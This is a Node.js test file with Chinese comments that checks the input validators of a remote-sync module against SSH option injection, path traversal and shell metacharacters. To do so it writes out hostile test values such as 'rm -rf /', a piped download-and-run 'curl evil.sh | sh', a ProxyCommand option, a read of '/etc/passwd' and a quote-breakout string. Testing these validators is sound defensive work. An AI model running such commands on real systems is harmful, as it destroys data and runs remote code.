#!/usr/bin/env node
'use strict';
/**
 * remote-sync 的校验函数测试（2026-10-09）
 *
 * ⚠️ 为什么要写 ✗✗：
 *   这个模块 **1359 行、零测试**，而它管的是**往远端机器同步** ——
 *   一次拼错命令就是「在别人服务器上跑错东西」。
 *   更直接的动因：今天**真实事故**就出在同步链路上
 *   （用户的备忘录被合并逻辑覆盖过一次）。
 *
 * 覆盖重点：**防注入**。
 *   · 防 SSH 选项注入（host/user 以 `-` 开头会被 ssh 当成选项 ✓）
 *   · 防路径逃逸（remoteDir 里的 `..` ✓）
 *   · 防 shell 元字符（`;` `&&` `$()` 反引号 ✓）
 *   · quoteRemote 的包裹是否真的闭合不了 ✓
 *
 * 运行：node tests/remote-sync-guards.js
 */
const { __test } = require('../lib/remote-sync.js');
const T = __test;

let pass = 0, fail = 0;
const fails = [];
function ok(label, cond, detail) {
  if (cond) { pass++; return; }
  fail++;
  fails.push(label + (detail === undefined ? '' : '   → ' + String(detail).slice(0, 120)));
}
/* 应该抛错的用例 ✓ */
function rejects(label, fn) {
  try { const v = fn(); ok(label, false, '居然通过了，返回 ' + JSON.stringify(v)); }
  catch (_) { ok(label, true); }
}
function accepts(label, fn, expect) {
  try {
    const v = fn();
    ok(label, expect === undefined || v === expect, '返回 ' + JSON.stringify(v));
  } catch (e) { ok(label, false, '抛错了：' + (e && e.message)); }
}

/* ── assertHost：防 SSH 选项注入 ✓ ── */
console.log('  ── assertHost ──');
accepts('正常域名', () => T.assertHost('example.com'), 'example.com');
accepts('IPv4', () => T.assertHost('192.168.1.1'), '192.168.1.1');
accepts('带端口 / IPv6 冒号写法', () => T.assertHost('host:2222'), 'host:2222');
accepts('空值放行（可选字段）', () => T.assertHost(''), '');
rejects('★ 以横线开头（会被 ssh 当成选项）', () => T.assertHost('-oProxyCommand=curl evil'));
rejects('★ 带分号', () => T.assertHost('host; rm -rf /'));
rejects('★ 带管道', () => T.assertHost('host|cat /etc/passwd'));
rejects('★ 带空格', () => T.assertHost('host name'));
rejects('★ 带反引号', () => T.assertHost('host`id`'));
rejects('★ 带 $()', () => T.assertHost('host$(id)'));
rejects('超长', () => T.assertHost('a'.repeat(256)));

/* ── assertUser ── */
console.log('  ── assertUser ──');
accepts('正常用户名', () => T.assertUser('robot'), 'robot');
accepts('带点 / 横线 / 下划线', () => T.assertUser('a.b-c_d'), 'a.b-c_d');
rejects('★ 以横线开头', () => T.assertUser('-oProxyCommand=x'));
rejects('★ 带分号', () => T.assertUser('robot;id'));
rejects('带 @（不允许）', () => T.assertUser('robot@host'));

/* ── assertPort ── */
console.log('  ── assertPort ──');
accepts('22', () => T.assertPort('22'), 22);
accepts('65535', () => T.assertPort(65535), 65535);
rejects('0', () => T.assertPort('0'));
rejects('65536', () => T.assertPort('65536'));
rejects('负数', () => T.assertPort('-1'));
rejects('非数字', () => T.assertPort('abc'));
rejects('空', () => T.assertPort(''));
rejects('带小数', () => T.assertPort('22.5'));

/* ── assertRemoteDir：防路径逃逸 ✓ ── */
console.log('  ── assertRemoteDir ──');
accepts('正常绝对路径', () => T.assertRemoteDir('/data/codescope'), '/data/codescope');
accepts('末尾斜杠会被去掉', () => T.assertRemoteDir('/data/x/'), '/data/x');
accepts('带空格', () => T.assertRemoteDir('/data/my project'), '/data/my project');
accepts('空值放行', () => T.assertRemoteDir(''), '');
rejects('★ 根目录', () => T.assertRemoteDir('/'));
rejects('★ 相对路径', () => T.assertRemoteDir('data/x'));
rejects('★★ 含 ..（逃逸）', () => T.assertRemoteDir('/data/../../etc'));
rejects('★★ 以 .. 结尾', () => T.assertRemoteDir('/data/..'));
rejects('★ 单个 . 段', () => T.assertRemoteDir('/data/./x'));
rejects('★ 连续斜杠（空路径段）', () => T.assertRemoteDir('/data//x'));
rejects('★★ 带分号', () => T.assertRemoteDir('/data; rm -rf /'));
rejects('★ 带 $()', () => T.assertRemoteDir('/data/$(id)'));
rejects('★ 带反引号', () => T.assertRemoteDir('/data/`id`'));
rejects('★ 带单引号', () => T.assertRemoteDir("/data/x'; rm -rf /; '"));
rejects('超长', () => T.assertRemoteDir('/' + 'a'.repeat(T.REMOTE_DIR_MAX)));

/* ── assertProjectName ── */
console.log('  ── assertProjectName ──');
accepts('正常名字', () => T.assertProjectName('wheel_legged_RL', 'fb'), 'wheel_legged_RL');
accepts('空值走 fallback', () => T.assertProjectName('', 'fb'), 'fb');
rejects('★ 以点开头（隐藏 / . / ..）', () => T.assertProjectName('.hidden'));
rejects('★ 就是 ..', () => T.assertProjectName('..'));
rejects('★ 带斜杠', () => T.assertProjectName('a/b'));
rejects('★ 带分号', () => T.assertProjectName('a;id'));

/* ── assertTransport / assertBool ── */
console.log('  ── assertTransport / assertBool ──');
accepts('rsync', () => T.assertTransport('rsync'), 'rsync');
accepts('tar', () => T.assertTransport('tar'), 'tar');
rejects('未知 transport', () => T.assertTransport('curl'));
rejects('空 transport', () => T.assertTransport(''));
accepts('布尔 true', () => T.assertBool(true, 'x'), true);
accepts('字符串 false', () => T.assertBool('false', 'x'), false);
rejects('其它值', () => T.assertBool('yes', 'x'));

/* ── assertRestartCommand：★ 这里最容易出事 ✓ ── */
console.log('  ── assertRestartCommand（前缀白名单）──');
accepts('systemctl restart', () => T.assertRestartCommand('systemctl restart nginx'), 'systemctl restart nginx');
accepts('systemctl --user restart', () => T.assertRestartCommand('systemctl --user restart app.service'), 'systemctl --user restart app.service');
accepts('pm2 restart', () => T.assertRestartCommand('pm2 restart api'), 'pm2 restart api');
accepts('docker compose restart', () => T.assertRestartCommand('docker compose restart web'), 'docker compose restart web');
accepts('空值放行', () => T.assertRestartCommand(''), '');
rejects('★ 任意命令（rm）', () => T.assertRestartCommand('rm -rf /'));
rejects('★★ 前缀对了但追加分号命令', () => T.assertRestartCommand('systemctl restart nginx; rm -rf /'));
rejects('★★ 前缀对了但追加 && 命令', () => T.assertRestartCommand('systemctl restart nginx && curl evil.sh | sh'));
rejects('★★ 前缀对了但带 $()', () => T.assertRestartCommand('systemctl restart $(whoami)'));
rejects('★ 带管道', () => T.assertRestartCommand('systemctl restart nginx | sh'));
rejects('★ 带反引号', () => T.assertRestartCommand('systemctl restart `id`'));
rejects('★ 带重定向', () => T.assertRestartCommand('systemctl restart nginx > /etc/passwd'));
rejects('★ 带换行（偷渡第二条命令）', () => T.assertRestartCommand('systemctl restart nginx\nrm -rf /'));
rejects('前缀对但缺服务名', () => T.assertRestartCommand('systemctl restart'));
rejects('前缀不是白名单里的', () => T.assertRestartCommand('service nginx restart'));

/* ── quoteRemote：包裹是否真的闭合不了 ✓ ── */
console.log('  ── quoteRemote ──');
ok('用单引号包裹', T.quoteRemote('abc') === "'abc'", T.quoteRemote('abc'));
ok('含空格的值也安全', T.quoteRemote('/data/my project') === "'/data/my project'");
ok('含双引号的值不受影响', T.quoteRemote('a"b') === "'a\"b'", T.quoteRemote('a"b'));
/* ★★ 值里的单引号必须被处理掉 ✓（2026-10-09 加固）——
   原来是 `'` + value + `'`，值里含 `'` 就能闭合逃逸；
   现在改成 POSIX 标准写法（`'` → `'\''`），**任何值都闭合不了** ✓。
   ⚠️ 这条是**真的安全断言** ✓，不是「记录当前行为」✓。 */
const evil = "/data/x'; rm -rf /; '";
const esc = T.quoteRemote(evil);
ok('★★ 值里的单引号被转义（闭合不了）', esc === "'/data/x'\\''; rm -rf /; '\\'''", esc);
/* ⚠️ 别再写「检查未转义单引号只出现在边界」那种绕的断言 ✗ ——
   我第一版就是那么写的，结果**断言本身有 bug** ✓（转义判断写错了 ✓），
   报了一个假失败 ✓。上面那条**精确比对**已经够了 ✓，越简单越可靠 ✓。 */
ok('普通值不受影响（还是简单包裹）', T.quoteRemote('/data/x') === "'/data/x'", T.quoteRemote('/data/x'));
ok('空值也是合法包裹', T.quoteRemote('') === "''", T.quoteRemote(''));

/* ── excludePatterns / matchesExclude ── */
console.log('  ── 排除项 ──');
ok('默认排除里有 node_modules', T.excludePatterns({}).includes('node_modules'));
ok('includeNodeModules 时去掉它', !T.excludePatterns({ includeNodeModules: true }).includes('node_modules'));
ok('匹配精确名', T.matchesExclude('.git', ['.git']) === true);
ok('匹配 * 后缀', T.matchesExclude('a.log', ['*.log']) === true);
ok('不匹配无关名', T.matchesExclude('src', ['.git', '*.log']) === false);

console.log('');
console.log('  通过 ' + pass + ' · 失败 ' + fail);
if (fail) {
  console.log('');
  console.log('  失败明细:');
  fails.forEach((f) => console.log('    ✗ ' + f));
  process.exitCode = 1;
} else {
  console.log('  ✓ remote-sync 的校验函数全部符合预期');
}
